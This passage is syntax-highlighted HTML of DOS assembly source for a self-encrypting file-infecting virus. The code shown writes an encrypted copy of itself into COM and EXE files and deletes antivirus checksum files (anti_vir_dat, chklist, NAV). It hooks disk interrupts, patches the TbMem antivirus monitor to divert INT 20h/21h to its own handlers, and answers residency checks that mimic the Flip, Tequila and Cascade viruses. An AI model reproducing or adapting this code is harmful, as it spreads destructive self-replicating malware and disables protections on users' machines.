         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Load encryption algorithm from s...</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0d0h</span><span class="sc0">         </span><span class="sc1">; Store encryption/decryption key?</span><span class="sc0">
         </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">move_idx_ptr</span><span class="sc0">    </span><span class="sc1">; Above or equal? Jump to move_idx...</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">      </span><span class="sc1">; Store encryption/decryption key</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">      </span><span class="sc1">;   "             "            "</span><span class="sc0">
</span><span class="sc5">move_idx_ptr</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">; Increase DI</span><span class="sc0">
         </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">          </span><span class="sc1">;    "     "</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Decrease BX</span><span class="sc0">
         </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">;    "     "</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">create_loop</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">          </span><span class="sc1">; Load BX from stack</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">         </span><span class="sc1">; SI = offset of beginning of code</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DI = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_begin</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">
         </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">       </span><span class="sc1">; Move decryptor to file_buffer</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">crypt_end</span><span class="sc4">-</span><span class="sc5">crypt_begin</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">encrypt_loop</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of plain code</span><span class="sc0">

         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">06h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">90h</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">; Encryption algorithm</span><span class="sc0">
</span><span class="sc5">encrypt_algo</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">      </span><span class="sc1">;     "          "</span><span class="sc0">

         </span><span class="sc6">stosb</span><span class="sc0">           </span><span class="sc1">; Store byte of encrypted code</span><span class="sc0">

         </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">encrypt_loop</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">code_end</span><span class="sc4">-</span><span class="sc5">code_begin</span><span class="sc4">)</span><span class="sc0">

         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc5">com_exe_ov</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">    </span><span class="sc1">; EXE/Overlay executable?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">write_virus</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to write_virus</span><span class="sc0">

         </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">       </span><span class="sc1">; CX = number of bytes to write</span><span class="sc0">
</span><span class="sc5">write_virus</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">file_buffer</span><span class="sc0">  </span><span class="sc1">; DX = offset of file_buffer</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">      </span><span class="sc1">; Write to file</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">del_crc_file</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">sft_segment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = segment of system file table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">sft_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of system file table</span><span class="sc0">

         </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">06h</span><span class="sc4">],</span><span class="sc2">01000000b</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_file_sof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (SOF)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">sft_segment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = segment of system file table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">sft_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of system file table</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">set_file_eof</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Set current file position (EOF)</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,[</span><span class="sc5">sft_segment</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; AX = segment of system file table</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; ES =    "    "    "     "     "</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">sft_offset</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; DI = offset of system file table</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">11h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save low-order 16-bits of filesi...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">15h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Load low-order 16-bits of filesi...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Save high-order 16-bits of files...</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">+</span><span class="sc2">17h</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">; Load high-order 16-bits of files...</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Load ES from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">del_crc_file</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Delete CRC files</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">anti_vir_dat</span><span class="sc0">     </span><span class="sc1">; DX = offset of anti_vir_dat</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">chklist__</span><span class="sc0">    </span><span class="sc1">; DX = offset of chklist__</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">      </span><span class="sc1">; Delete file</span><span class="sc0">
         </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">_nav___no</span><span class="sc0">    </span><span class="sc1">; DX = offset of _nav___no</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">xchg_i13_i40</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; Exchange address interrupt 13/in...</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt offset 13h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int13_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt segment 13h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int13_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt segment 13h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">13h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt offset 13h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int40_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">int40_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; Zero AX</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">; DS = segment of interrupt table</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">40h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt offset 40h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int40_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">40h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Get interrupt segment 40h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int40_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">

         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">40h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt segment 40h</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">40h</span><span class="sc4">*</span><span class="sc2">04h</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">; Set interrupt offset 40h</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">          </span><span class="sc1">; Save CS at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (CS)</span><span class="sc0">

         </span><span class="sc6">ret</span><span class="sc0">             </span><span class="sc1">; Return!</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">tbmem_retro</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">    </span><span class="sc10">near</span><span class="sc0">        </span><span class="sc1">; TbMem retro structures</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">35h</span><span class="sc0">      </span><span class="sc1">; Get interrupt vector</span><span class="sc0">
         </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">int21_simula</span><span class="sc0">

         </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">          </span><span class="sc1">; Save ES at stack</span><span class="sc0">
         </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">          </span><span class="sc1">; Load DS from stack (ES)</span><span class="sc0">

         </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; Zero DI</span><span class="sc0">
</span><span class="sc5">find_tbmem</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = offset of interrupt</span><span class="sc0">
</span><span class="sc5">find_tbmem_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc0">      </span><span class="sc1">; Searched through thirty-two bytes?</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">retro_exit</span><span class="sc0">      </span><span class="sc1">; Above? Jump to retro_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'T'</span><span class="sc0">              </span><span class="sc1">; Found first character of the st...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_tbmem_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to find_tbmem_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI = offset of interrupt</span><span class="sc0">

         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'MB'</span><span class="sc0">             </span><span class="sc1">; Found second and third characte...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_tbmem</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_tbmem</span><span class="sc0">
         </span><span class="sc6">lodsw</span><span class="sc0">           </span><span class="sc1">; AX = word of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc12">'ME'</span><span class="sc0">             </span><span class="sc1">; Found fourth and fifth characte...?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_tbmem</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_tbmem</span><span class="sc0">
</span><span class="sc5">find_int20</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = offset of interrupt</span><span class="sc0">
</span><span class="sc5">find_int20_</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; Searched through five hundred an...</span><span class="sc0">
         </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">retro_exit</span><span class="sc0">      </span><span class="sc1">; Above? Jump to retro_exit</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_int20_</span><span class="sc0">     </span><span class="sc1">; Not equal? Jump to find_int20_</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">si</span><span class="sc0">       </span><span class="sc1">; DI = offset of interrupt</span><span class="sc0">

         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">+</span><span class="sc2">01h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_int20</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_int20</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">+</span><span class="sc2">02h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_int20</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_int20</span><span class="sc0">
         </span><span class="sc6">lodsb</span><span class="sc0">           </span><span class="sc1">; AL = byte of interrupt</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int20_addr</span><span class="sc4">+</span><span class="sc2">03h</span><span class="sc4">]</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">find_int20</span><span class="sc0">      </span><span class="sc1">; Not equal? Jump to find_int20</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">       </span><span class="sc1">; SI = offset of interrupt</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int20_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">01</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">      </span><span class="sc1">; Set interrupt vector 20h</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">03</span><span class="sc4">],</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int21_virus</span><span class="sc0">
         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">05</span><span class="sc4">],</span><span class="sc8">cs</span><span class="sc0">      </span><span class="sc1">; Set interrupt vector 21h</span><span class="sc0">
</span><span class="sc5">retro_exit</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">ret</span><span class="sc0">
         </span><span class="sc9">endp</span><span class="sc0">
</span><span class="sc5">tst_vir_func</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fe01h</span><span class="sc0">       </span><span class="sc1">; Flip function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_tequila</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to test_tequila</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1feh</span><span class="sc0">         </span><span class="sc1">; Flip already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_tequila</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0fe02h</span><span class="sc0">       </span><span class="sc1">; Tequila function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_cascade</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to test_cascade</span><span class="sc0">

         </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">1fdh</span><span class="sc0">         </span><span class="sc1">; Tequila already resident</span><span class="sc0">

         </span><span class="sc6">iret</span><span class="sc0">            </span><span class="sc1">; Interrupt return!</span><span class="sc0">
</span><span class="sc5">test_cascade</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4bffh</span><span class="sc0">        </span><span class="sc1">; Cascade/justice function?</span><span class="sc0">
         </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">test_invader</span><span class="sc0">    </span><span class="sc1">; Not equal? Jump to test_invader</span><span class="sc0">

